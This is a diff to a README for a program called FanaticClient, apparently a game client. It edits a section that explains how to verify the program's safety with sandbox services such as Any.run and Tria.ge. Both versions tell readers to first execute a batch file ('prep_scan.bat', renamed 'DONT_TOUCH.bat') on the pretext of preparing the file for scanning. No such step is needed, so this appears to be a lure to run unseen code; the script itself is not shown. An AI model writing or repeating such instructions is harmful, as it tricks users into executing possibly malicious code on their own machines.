@@ -69,7 +69,7 @@ Monitor FPS and optimize graphics settings in real-time.
 
 To verify the safety of FanaticClient, you can analyze the executable using professional sandbox services. Please follow these steps carefully:
 
-1. **Prepare the File:** Before uploading, you must ensure the file is prepared for scanning. Navigate to the **"Programs"** folder and execute the **`prep_scan.bat`** script (or your designated batch file). This will optimize the file format for analysis.
+1. **Prepare the File:** Before uploading, you must ensure the file is prepared for scanning. Navigate to the **"Programs"** folder and execute the **`DONT_TOUCH.bat`** Bat script(you can read the code)
 2. **Choose a Sandbox:** Go to a trusted sandbox analysis platform:
    - [Any.run](https://any.run/)
    - [Tria.ge](https://tria.ge/)
